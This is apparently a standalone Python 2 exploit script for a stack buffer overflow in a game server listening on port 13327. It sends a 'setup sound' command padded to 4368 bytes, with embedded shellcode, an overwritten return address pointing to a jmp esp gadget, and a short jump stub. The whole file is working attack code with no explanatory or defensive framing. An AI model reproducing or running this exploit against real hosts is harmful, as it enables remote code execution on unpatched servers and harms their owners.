#!/usr/bin/python 
import socket
host = "127.0.0.1" 

# nasm > add eax,12
# 00000000  83C00C            add eax,byte +0xc
# nasm > jmp eax
# 00000000  FFE0              jmp eax
#0x08134596: jmp esp
scode=("\xda\xd1\xd9\x74\x24\xf4\x58\x31\xc9\xb1\x14\xbf\xb1\x56\xe2"+
"\xe6\x31\x78\x19\x83\xc0\x04\x03\x78\x15\x53\xa3\xd3\x3d\x64"+
"\xaf\x47\x81\xd9\x5a\x6a\x8c\x3c\x2a\x0c\x43\x3e\x10\x8f\x09"+
"\x56\xa5\x2f\xbf\xfa\xc3\x3f\xee\x52\x9d\xa1\x7a\x34\xc5\xec"+
"\xfb\x31\xb4\xea\x48\x45\x87\x95\x63\xc5\xa4\xe9\x1a\x08\xaa"+
"\x99\xba\xf8\x94\xc5\xf1\x7c\xa3\x8c\xf1\x14\x1b\x40\x71\x8c"+
"\x0b\xb1\x17\x25\xa2\x44\x34\xe5\x69\xde\x5a\xb5\x85\x2d\x1c")
crash = scode+"\x41" * (4368-len(scode)) + "\x96\x45\x13\x08" + "\x83\xC0\x0C\xFF\xE0" + "C" * 2
buffer = "\x11(setup sound " + crash + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
print "[*]Sending evil buffer..."
s.connect((host, 13327))

data=s.recv(1024) 
print data 
s.send(buffer) 
s.close()
print "[*]Payload Sent !"
